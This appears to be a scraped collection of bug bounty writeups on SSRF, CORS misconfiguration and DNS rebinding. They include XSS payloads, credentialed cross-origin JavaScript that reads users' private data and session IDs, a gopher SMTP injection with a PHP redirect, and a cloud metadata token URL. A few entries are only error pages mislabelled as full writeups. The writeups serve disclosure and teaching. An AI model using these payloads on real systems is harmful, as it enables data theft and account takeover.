you learn Now it’s time for some self-advertisment Are you tired of exploiting DNS Rebinding without gui? This may sound Scriptkiddie-ish but I actually wanted something with gui and logs How it went down I was on a vacation and I got sick probably from the food and I couldn’t go out swimming. So I pulled out my laptop and started working on a Flask api connected to modified dns server via SQL and Redis… And I Can’t forget the React frontend, It was the worst thing of it all. Sorry frontend fanboys, I just value my mental health. After 1.5 days Everything except from the React app of course was done, You can actually check the code out Here and the Live Version with dns server and everything is Here - you can register, create rebind rules, use it to hack something, watch logs and stuff like that. Yes it’s and http link I know that and I hate myself for that but I’m too lazy to spend 2 minutes with certbot For those who didn’t look thamselves what it does is I tell it to make a subdomain that will resolve to 1.2.3.4 3 times and then to 127.0.0.1 1 time It puts the data into db and gives me something like y1982ehiuwqh82319j2139821.gel0.space when I make a query to this domain, dns server looks into db, loads the data into redis for quicker future access and then resolves it based on the rules given If you have a bit of free time, don’t watch netflix - Hack, create and most importantly contribute to https://github.com/makuga01/dnsFookup 😇 I will be veryveryvery happy if someone adds some feature to it or adds something to the frontend, the BE api is nice and working but the frontend is a problem for me Anyway thanks for reading! Hope you liked this writeup, If you have some questions/suggestions/you just wanna talk with some cringy script kiddie just DM me on twitter @marek_geleta or anywhere else I will almost certainly respond to you in few minutes, I like talking to people 😄 I’m sorry for the amount of text/things learned I will get better I promise, I just like writing stories with incorrect grammar PS. sory for my Englandish, It not my primar languge Author: Marek Geleta Words: 1545 Share: Released under CC BY-NC 4.0 Tag: #bugbounty #ssrf #writeup #security #bug #bounty #dns rebinding Back · Home A tale of verbose error message and a JWT token comments powered by Disqus © 2019 - 2020 Marek Geleta"}
{"source_url": "https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437", "title": "Vimeo upload function SSRF. TL;DR | by Sayed Abdelhafiz | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nVimeo upload function SSRF. TL;DR | by Sayed Abdelhafiz | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Vimeo upload function SSRF Sayed Abdelhafiz 4 min read · Dec 13, 2019 -- 7 Listen Share TL;DR I have found an SSRF vulnerability by exploiting content partial flow which the Vimeo upload function implements in the uploading process. The Journey I was studying the most subject I hate and decided to take a rest, I told myself that I wouldn’t lose anything If I hunted on my lovely target in HackerOne “Vimeo”, I bring my MacBook and I went direct to upload function specifically Google Drive upload feature, I chose to upload from google drive, chose video file, back to BurpSuite to catch the request: Press enter or click to view image in full size Upload Request As you can see, It sends the file URL with google authorization to let the backend server fetch the file from the URL and pass the authorization on the header to access the file from google drive. let’s setup WireShark in our VPS and make the backend request a video file from our server to see what would happen in the backend, that was the result: Press enter or click to view image in full size HTTP Stream Of Download request I noticed unusual headers, like Range , Content-Range . But its name was enough to tell me what it's work. we can assume that most of the time, the size of video files is big, so Vimeo doesn’t request the full file in one request if the size was big. if the video file is small, It will request the full file, if not It will request the file partially until collecting the full file, the following diagram can describe what happens: Press enter or click to view image in full size Normal person uploading The server sends a request to check the file size, then if the file was small as it can be transferred to the server by a single connection, it will request the full file. Suddenly , an idea came to me, what if I didn’t send the full file to the server? For example, if my server responded to the backend server telling it that the file length was 500B , the server will request the 500B , now what if I responded to the server with 200B of data? let’s try it ;) I have coded a Web Server in Python to test it, The full file length is 554231B , when Vimeo requests the full file, my server will respond by 8228B Only! my server will log Vimeo Range the header for me :) Press enter or click to view image in full size My baby script Cool! the server stored the 8228B , requested the rest of the file, Cool! I have a scenario that can lead to SSRF in this case. What If my server responded with a redirect response? vimeo will follow the redirect? store the response? request me the rest? If there rest The following diagram knocked my brain: Press enter or click to view image in full size I love drawing diagrams some web servers restricted me to reproduce the attack, So I decided to code a pure HTTP server to perform this attack, I coded, ran it, and passed my attacker host to the upload function, SURPRISE! my attack works fine! my thoughts were right D: Notice: in Vimeo you can download your original video file, so you can find the request forgery response easily Press enter or click to view image in full size Time to exploit I have gathered information about the server, it was a google cloud Instance, so lets try to retrieve instance metadata, I changed the redirect target to http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token , reproduced the attack and I was able to get their compute engine API access token! it was a great moment for me because it was the first SSRF with the most critical impact I have ever found. Press enter or click to view image in full size Oh What now? Sent to Vimeo, resolved, and paid in 2d! Thanks for reading ;) Timeline Apr 29th: Triaged by HackerOne team. Apr 29th: Vimeo rewarded me initially. May 1st: The vulnerability has been fixed. May 1st: Vimeo rewarded me with the rest of the bounty. Bughunting Vimeo Hackerone Ssrf -- -- 7 Written by Sayed Abdelhafiz 948 followers · 7 following Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5", "title": "SSRF via FFmpeg HLS processing. What is FFmpeg ? | by Pflash Punk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSSRF via FFmpeg HLS processing. What is FFmpeg ? | by Pflash Punk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mastodon SSRF via FFmpeg HLS processing Pflash Punk 2 min read · Dec 11, 2019 -- 2 Listen Share Press enter or click to view image in full size FFmpeg Logo FFmpeg is a free and open-source project consisting of a vast software suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files, and widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects, and standards compliance. FFmpeg is known to process HLS playlists that may contain references to external files. Story ! I received a private invitation on bugcrowd , lets call it REDACTED.COM . Basically Redacted.com is a video transcoding platform , so its 99% sure that they’ll be using FFmpeg :P So its obvious the first test i’ll perform on the target will be SSRF only using FFmpeg HLS Processing. Setup ! 1.A small server , just to check logs , you can use AWS or DigitalOcean. 2. B-XSSRF to check the requests. Download it from Here . ( Don’t forget to read the instructions given in repo ) 3. Malicious AVI file. Download it from Here . 4. Open the downloaded AVI file in notepad++ , search for http://127.0.0.1/request.php and replace it with yours. Testing ! Now we are ready to test SSRF with FFmpeg. Logged in to Redacted.com Uploaded the video. Checked for requests received . Press enter or click to view image in full size 4. Bingo ! its vulnerable :P What’s next ? Reported to the vendor on bugcrowd -> Duplicate -> LOL Press enter or click to view image in full size Anyway’s it may help you :) Bug Bounty Security Bugs Hacking Hacking Training -- -- 2 Written by Pflash Punk 99 followers · 2 following Bug hunter , learner , CO-Founder @ Blackroot Technologies :) Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@sandh0t/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397", "title": "Think Outside the Scope: Advanced CORS Exploitation Techniques | by Ayoub Safa (Sandh0t) | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sandh0t/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThink Outside the Scope: Advanced CORS Exploitation Techniques | by Ayoub Safa (Sandh0t) | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Think Outside the Scope: Advanced CORS Exploitation Techniques Ayoub Safa (Sandh0t) 7 min read · May 14, 2019 -- 7 Listen Share Hi everyone, My name is Ayoub, I’m a security researcher from Morocco. In this article, I will be describing two different cases of how I was able to exploit a CORS misconfiguration: The first case based on an XSS, and requires thinking outside of the scope, and the second is based on an advanced CORS exploitation technique. Note: Before You start reading this write-up, you will need to have a basic understanding of what CORS is and how to exploit misconfigurations. Here are some awesome posts to get you caught up: Portswigger’s Post Geekboy’s Pos t Case:#1 Vulnerable Endpoint About a year ago, I was hacking this private program, hosted by HackerOne. After playing with the Origin header in the HTTP request, then inspecting server response to check if they do domains whitelist check or not, I noticed that the application is blindly whitelisting only the subdomains, even non-existing ones. For privacy reasons and the responsible disclosure policy, let’s assume that the web application is hosted in: www.redacted.com This CORS misconfiguration looks something like this: HTTP Request: GET /api/return HTTP/1.1 Host: www.redacted.com Origin: evil.redacted.com Connection: close HTTP Response: HTTP/1.1 200 OK Access-control-allow-credentials: true Access-control-allow-origin: evil.redacted.com This API endpoint was returning the user’s private information, like full name, email address, …. To abuse this misconfiguration so we can perform an attack, like leaking users’ private information, we need either to claim an abandoned subdomain ( Subdomain Takeover), or find an XSS in one of the existing subdomains. Think Outside The Scope Finding an abandoned subdomain is not that trivial, so I decided to go for the second option, finding an XSS in one of the existing subdomains. However, the scope of this private program is limited to only: www.redacted.com, Which means that finding an XSS in other subdomain is definitely out of the scope, but chaining this XSS with the CORS misconfiguration is somehow in the Scope. Right? And, the fact that the other subdomains are out of scope, is the reason that made me more confident, that there is a big chance of finding an XSS on those subdomains since other hackers will not be testing them. So, I start searching for this XSS, with a heart full of hope to find it, And In less than one hour, I found one in banques.redacted.com , using the following payload: https://banques.redacted.com/choice-quiz?form_banque= \"><script>alert(document.domain)</script> &form_cartes=73&iframestat=1 Press enter or click to view image in full size Time to create a nice Proof of Concept, and submit a report Reproduce : So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain) , with the following code: function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \" https://www.redacted.com/api/return \", true); xhttp.withCredentials = true; xhttp.send(); } cors(); Like This : https://banques.redacted.com/choice-quiz?form_banque= \"> <script> function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById(\"demo\").innerHTML=this.responseText}};xhttp.open(\"GET\",\"https://www.redacted.com/api/return\",true);xhttp.withCredentials=true;xhttp.send()}cors(); </script> &form_cartes=73&iframestat=1 And Voilà, we now have a nice PoC: Press enter or click to view image in full size Reward Press enter or click to view image in full size Now, What if I told you that you can still abuse this issue without the need of finding an XSS in any of the existing subdomains, or claiming an abandoned one. That exactly what we will be discussing in the second case. Case:#2 Vulnerable Endpoint This time, I was working on the Ubnt Program, and especially the Application hosted in: https://protect.ubnt.com/ Following the same process, I identified the same CORS Misconfiguration, similar to the previous case, but this time the application fetches the user’s private information from a different location, An API hosted in: https://client.amplifi.com/ api/user/ This Application also blindly whitelist any subdomains, even non-existing ones. Press enter or click to view image in full size And, As we discussed before, to abuse this CORS misconfiguration you will need, either claiming an abandoned subdomain, or finding an XSS in one of the existing subdomains. And since this is a public program, with big scope (All the subdomains are in scope); there is a tiny chance of finding an XSS, not even mentioning a subdomain takeover vulnerability. So, did we reached a dead end? Advanced CORS Technique Well, It turns out, that there is another way, But it requires a certain condition to work. An interesting research done recently by Corben Leo can be found here . Showed that it’s possible to bypass some controls implemented incorrectly using special characters inside the domain name. This research is based on the fact that browsers do not always validate domain names before making requests. Therefore, if some special characters are used, the browser may currently submit requests without previously verifying if the domain name is valid and existent. Example: The fully understand this issue, let’s try to open a URL with special characters like: http://asdf`+=.withgoogle.com. Most browsers will validate the domain names before making any requests. The domain withgoogle.com , is used as a demo, because it’s has a wildcard DNS record Chrome: Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ Firefox: Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ Safari: As you can see, Safari is an exception, it will actually send the request and try to load the page, unlike the other browsers. Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ And we can use all sorts of different characters, even unprintable ones: ,&'\";!$^*()+=`~-_=|{}% // non printable chars %01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f Furthermore, another research done by Davide Danelon can be found here , showed that the other Subset of these special characters can also be used on other browsers. Press enter or click to view image in full size From Davide Danelon research: https://www.bedefended.com/papers/cors-security-guide Now, we know all of this, how can we abuse this issue to perform an Advance CORS Exploitation Technique, for a nice demonstration, let’s go back the vulnerable web application on: https://client.amplifi.com/ The new approach In this case, the web application also accepts the following Origin *.ubnt.com!.evil.com Press enter or click to view image in full size Not just the character “!” , but also the following ones: *.ubnt.com!.evil.com *.ubnt.com\".evil.com *.ubnt.com$.evil.com *.ubnt.com%0b.evil.com *.ubnt.com%60.evil.com *.ubnt.com&.evil.com *.ubnt.com'.evil.com *.ubnt.com(.evil.com *.ubnt.com).evil.com *.ubnt.com*.evil.com *.ubnt.com,.evil.com *.ubnt.com;.evil.com *.ubnt.com=.evil.com *.ubnt.com^.evil.com *.ubnt.com`.evil.com *.ubnt.com{.evil.com *.ubnt.com|.evil.com *.ubnt.com}.evil.com *.ubnt.com~.evil.com And you should know by now that some browsers, such as Safari, accept URL with special characters, like: https://zzzz.ubnt.com=.evil.com . So if we set up a domain: evil.com with a wildcard DNS record, allowing to point all the subdomains (*. evil.com) to www.evil.com , which will be hosting a script in a page like: www.evil.com/cors-poc that will simply send a cross-domain request with the subdomain name as the origin value to the vulnerable endpoint Then somehow we forced an authenticated user to open the link: https://zzzz.ubnt.com=.evil.com /cors-poc Theoretically, we can exfiltrate this user’s private information, as a result. Reproduce : First, set up a Domain with a wildcard DNS record pointing it to your box, in my case, I used GoDaddy to host my domain, with the following configuration: Press enter or click to view image in full size 2. Install NodeJS, create a new directory, and then save inside it the following file: serve.js var http = require('http'); var url = require('url'); var fs = require('fs'); var port = 80 http.createServer(function(req, res) { if (req.url == '/cors-poc') { fs.readFile('cors.html', function(err, data) { res.writeHead(200, {'Content-Type':'text/html'}); res.write(data); res.end(); }); } else { res.writeHead(200, {'Content-Type':'text/html'}); res.write('never gonna give you up...'); res.end(); } }).listen(port, '0.0.0.0'); console.log(`Serving on port ${port}`); 3. In the same directory, save the following: cors.html <!DOCTYPE html> <html> <head><title>CORS</title></head> <body onload=\"cors();\"> <center> cors proof-of-concept:<br><br> <textarea rows=\"10\" cols=\"60\" id=\"pwnz\"> </textarea><br> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"pwnz\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \" https:// client.amplifi.com /api/user/ \", true); xhttp.withCredentials = true; xhttp.send(); } </script> 4. Start the NodeJS server by running the following command: node serve.js & 5. Now, sign in to the application on: https://protect.ubnt.com/ , and check that you can retrieve your account information from the endpoint: https://client.amplifi.com/api/user/ 6. Finally, open the link: https://zzzz.ubnt.com=.evil.com /cors-poc In Safari Browser, And Voilà. In my case I used the Safari browser in my iPhone as PoC, since I don’t have a Mac machine. Press enter or click to view image in full size Reward Press enter or click to view image in full size Takeaway I’m sure that a lot of security researcher had already been in such situation, and you can find lots of report in HackerOne describing this type of CORS misconfiguration, but only a few were able to fully exploited it, due to lack of a PoC in their report. That’s one of the reasons why I wanted to share my experience. also to highlight other techniques to exploit such vulnerability. Finally, Always remember, Sometimes you just need to think outside the ̶B̶o̶x̶ Scope. Thanks for reading. Feel free to follow me on Twitter https://twitter.com/sandh0t Happy Hunting. References: Portswigger’s Post Geekboy’s Pos t Corben Leo’s Research Davide Danelon‘s Research Bug Bounty Xss Attack Hackerone Hacking -- -- 7 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Ayoub Safa (Sandh0t) 574 followers · 41 following Sr. Security Engineer, Ethical Hacker, Bug Bounty Hunter At HackerOne, Synack Red Team, and BugCrowd. https://hackerone.com/sandh0t | Tweet @sandh0t Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@w_hat_boy/server-side-request-forgery-ssrf-port-issue-hidden-approch-f4e67bd8cc86", "title": "Server Side Request Forgery(SSRF){port issue hidden approch } | by Deepak Holani | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@w_hat_boy/server-side-request-forgery-ssrf-port-issue-hidden-approch-f4e67bd8cc86. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nServer Side Request Forgery(SSRF){port issue hidden approch } | by Deepak Holani | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Server Side Request Forgery(SSRF){port issue hidden approch } Deepak Holani 3 min read · May 3, 2019 -- 1 Listen Share Hello, This is my first write-up. I hope you will like this. Deepak Holani (@w_hat_boy) | Twitter The latest Tweets from Deepak Holani (@w_hat_boy). #appsec 🤗...#security twitter.com I was testing a private program, domain was in limited scope. This is related to social networking domain www.abc.com I was looking for the server-side issue I see their box for adding URL for job advertise first thing that come to my mind try for SSRF. SSRF Actions apply on different approaches depending on where you are looking for SSRF. what are some SSRF Actions >> Abuse the trust relationship between the vulnerable server and others. Bypass IP whitelisting. Bypass host-based authentication services. Read resources which are not accessible to the public. Scan the internal network to which the server is connected. Read files from the web server. View Status Pages and interact with APIs as the web server. Retrieve sensitive information such as the IP address of a web server behind a reverse proxy. As I said, it was a kind of social networking site. job posting URL box below: Press enter or click to view image in full size To add external job link I was testing for a port scan by simple localhost (127.0.0.1) and different ports. but on the web page, it was not showing any error as we have a cool friend burp. It was not showing me a open port or close. Now, what???? In addition to http:// I tried the other URL schema to read and make the server perform actions ( file:/// , dict:// , ftp://, ldap:// and gopher:// ). However, only http:// working, so I open my burp. I had two choices to check, so first I will check it with burp-collaborator you can read more about below link given and other by manual check by port .. Burp Collaborator This section contains information about What Burp Collaborator is, How Burp Collaborator works, Security of data… portswigger.net I check the target, below is the request and response. Note: If you do not have a VPS, a collaborator everywhere in the burp, can help you with testing. Press enter or click to view image in full size Press enter or click to view image in full size Received DNS lookup I decided to check whether the port was open or close. HTTPS:// was only allowed. port 443, 127.0.0.1:443 gave me 400 bad requests. Press enter or click to view image in full size 400 bad request on port 443 Port 22, 127.0.0.1:22 Press enter or click to view image in full size on port 22 In this way, I found many open ports or closed ones,and scanned all ports which threw 201 and 400 responses. Report details - 29-june-2018— Bug Reported to the company. 29-june-2018 — Bug triaged by team 29- june -2018—bug fixed 2-july-2018 — Reward me with a cool bounty and a program launched on hackerOne soon. Feel free to ask any question on this. Twitter @w_hat_boy Deepak Holani Deepak Holani is on Facebook. Join Facebook to connect with Deepak Holani and others you may know. Facebook gives… www.facebook.com Thanks :) Security Bug Bounty Ssrf Pentesting Web Development -- -- 1 Written by Deepak Holani 115 followers · 53 following Security Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@androgaming1912/gain-adfly-smtp-access-with-ssrf-via-gopher-protocol-26a26d0ec2cb", "title": "Gain adfly SMTP access with SSRF via Gopher Protocol | by Zerb0a | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@androgaming1912/gain-adfly-smtp-access-with-ssrf-via-gopher-protocol-26a26d0ec2cb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGain adfly SMTP access with SSRF via Gopher Protocol | by Zerb0a | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Gain adfly SMTP access with SSRF via Gopher Protocol Zerb0a 2 min read · Jun 27, 2019 -- 2 Listen Share Press enter or click to view image in full size Adfly Logo Hi guys, My name is Rafli pasya. Today i want to share my story about SSRF on adfly, this bug i found 4 days ago and already Fixed. Two month ago i found IDOR on adfly, and 4 days ago i found SSRF on adfly, using this vulnerability i able to send an email using adfly SMTP. it’s absolutely Dangerous if another hacker using this to attack Adfly Client. Exploitation i prepared this tool : 1. Gopheru s 2. Server to upload php file First of all i tried to short a Gopher:// url but it’s blocked by server. so i make a php file contains Gopherus Payload and it’s actually work. i opened a CMD and type : gopherus.py —exploit fastcgi this is used to exploit fastcgi and gain RCE, unfortunally because i unable to see response body (only able to see <title> tag) this exploit not work. So i tried to use SMTP exploit : gopherus.py — exploit smtp From Mail : adf@ly To Mail : [myemail@.x.y] Subject: PoCSSRF Text: [empty] Payload : gopher://127.0.0.1:25/_MAIL%20FROM:adf%40ly%0ARCPT%20To:myemail%0ADATA%0AFrom:adf%40ly%0ASubject:PoCSSRF%0AMessage:%0A. Now i make a php file : <?php header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:adf%40ly%0ARCPT%20To:myemail%0ADATA%0AFrom:adf%40ly%0ASubject:PoCSSRF%0AMessage:%0A.’); ?> and i upload it to my server. then i visit adfly site and short myserver.com/poc.php after 1–5 minutes i check my Inbox and see an email from adf@ly.adf.ly Press enter or click to view image in full size i quickly Report this bug to their team. it’s fixed 1 day after i reported the bug. Thx for Reading, soory for bad English btw. Original WriteUp : https://raflipasya19.blogspot.com/2019/06/adfly-ssrf-to-smtp-takeover.html Timeline : - Sunday 23 June 2019 23:35 GMT+7 = Bug Found & Reported - Monday 24 June 2019 17:16 GMT+7 = Triaged - Monday 24 June 2019 22:34 GMT+7 = Bug Fixed PHP Infosec Bug Bounty Bug Bounty Writeup Infosec Writeup -- -- 2 Written by Zerb0a 129 followers · 3 following Blogg : https://raflipasya19.blogspot.com Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30", "title": "Pre-domain wildcard CORS Exploitation | by Arbaz Hussain | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPre-domain wildcard CORS Exploitation | by Arbaz Hussain | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Pre-domain wildcard CORS Exploitation Arbaz Hussain 3 min read · Aug 26, 2017 -- 3 Listen Share Press enter or click to view image in full size Severity: High Complexity: Medium Weakness : Trusting Pre-domain Wildcard as Origin Some websites make classic URL parsing mistakes when attempting to verify whether an origin should be trusted. For example, a site which I’ll call advisor.com trusts all origins that ended in advisor.com, including definitelynotadvisor.com Following are the Test Cases tried for finding predomain wildcard weakness : Calling it as REDACTED.COM since it is private program on Hackerone. * TEST 1 : GET /account HTTP/1.1 Host: connect.redacted.com Connection: close Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: redacted.com Accept-Language: en-US,en;q=0.8 Cookie: Origin: https://redacted.com * Response : Access-Control-Allow-Credentials: true Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, X-Context, X-Session-ID Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS Access-Control-Allow-Origin: https://redacted.com Access-Control-Max-Age: 3600 Test 2 : GET /account HTTP/1.1 Host: connect.redacted.com Connection: close Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: redacted.com Accept-Language: en-US,en;q=0.8 Cookie: Origin: https://evil.com * Response : HTTP/1.1 302 Found Content-Type: text/html;charset=utf-8 Date: Wed, 23 Aug 2017 20:00:08 GMT Location: https://connect.redacted.com/auth Test 3: GET /account HTTP/1.1 Host: connect.redacted.com Connection: close Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: redacted.com Accept-Language: en-US,en;q=0.8 Cookie: Origin: https://redacted.com.evil.com * Response : HTTP/1.1 302 Found Content-Type: text/html;charset=utf-8 Date: Wed, 23 Aug 2017 20:00:08 GMT Location: https://connect.redacted.com/auth Test 4: GET /account HTTP/1.1 Host: connect.redacted.com Connection: close Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: redacted.com Accept-Language: en-US,en;q=0.8 Cookie: Origin: https://connect.redacted.com.evil.com * Response : HTTP/1.1 302 Found Content-Type: text/html;charset=utf-8 Date: Wed, 23 Aug 2017 20:00:08 GMT Location: https://connect.redacted.com/auth Test 5: GET /account HTTP/1.1 Host: connect.redacted.com Connection: close Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: redacted.com Accept-Language: en-US,en;q=0.8 Cookie: Origin: https://evilredacted.com * Response : Access-Control-Allow-Credentials: true Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, X-Context, X-Session-ID Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS Access-Control-Allow-Origin: https://evilredacted.com Access-Control-Max-Age: 3600 From Test 5 it is clear that application is Just Verifying Origin By Checking If it Ends with redacted.com (ACAH) Along with Different Methods are Also Enabled , This Means Attacker Can Make different Request’s Behalf of the Victim . To Successfully Exploit this We Need *redacted.com domain So , I Went to Bought it kiraakredacted.com to exploit it Exploitation : Now it’s time to find Good Exploitation Endpoint to demonstrate & Increase the Impact.There was nothing much on connect.redacted.com to exploit just like static site asking to install their browser extension . But one thing kept my MINDSET to find some exploitation path is that to install that extension you need to be logged in . I doubted they were storing some information somewhere . So I Started bruteforcing , Reading docs for API Endpoints . And came across https://connect.redacted.com/v1/user which contain’s the user detail’s along with SESSIONID in json response . <html> <body> <button type='button' onclick='cors()'>xxx</button> <p id='demo'></p> <p id='session'></p> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"demo\").innerHTML = this.responseText; parsed = JSON.stringify(this.responseText); var arr = []; for(var x in parsed){ arr.push(parsed[x]); } console.log(arr) document.getElementById(‘session’).innerHTML = arr[13]; } }; xhttp.open(\"GET\", \"https://connect.redacted.com/v1/user\", true); xhttp.withCredentials = true; xhttp.send(); } </script> </body> </html> Press enter or click to view image in full size Response Able to Takeover user account’s remotely. Press enter or click to view image in full size Reference : http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html JavaScript Bug Bounty Cors Hacking Infosec -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@0ktavandi/blind-ssrf-in-stripe-com-due-to-sentry-misconfiguration-60ebb6a40b5", "title": "410 account suspended — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@0ktavandi/blind-ssrf-in-stripe-com-due-to-sentry-misconfiguration-60ebb6a40b5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 account suspended — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 This account is under investigation or was found in violation of the Medium Rules. There are thousands of stories to read on Medium. Visit our homepage to find one that’s right for you. Take me to Medium"}
{"source_url": "https://evanricafort.blogspot.com/2019/08/ssrf-vulnerability-in.html", "title": "Redirecting", "friendly_explanation": "This is a bug bounty writeup from https://evanricafort.blogspot.com/2019/08/ssrf-vulnerability-in.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting You're about to be redirected The blog that used to be here is now at http://blog.evanricafort.com/2019/08/ssrf-vulnerability-in.html. Do you wish to be redirected? This blog is not hosted by Blogger and has not been checked for spam, viruses and other forms of malware. Yes No Help Help Centre Help Forum Video Tutorials Community Blogger Buzz Developers Blogger API Developer Forum © 1999 – 2025 Google Terms of Service Privacy Content Policy"}
{"source_url": "https://jin0ne.blogspot.com/2019/11/bugbounty-simple-ssrf.html", "title": "Jinone'bugbounty", "friendly_explanation": "This is a bug bounty writeup from https://jin0ne.blogspot.com/2019/11/bugbounty-simple-ssrf.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJinone'bugbounty Skip to main content Search Search This Blog Jinone'bugbounty Sorry, the page you were looking for in this blog does not exist. Powered by Blogger Theme images by Matt Vince Jinone Visit profile About me Hackerone Twitter"}
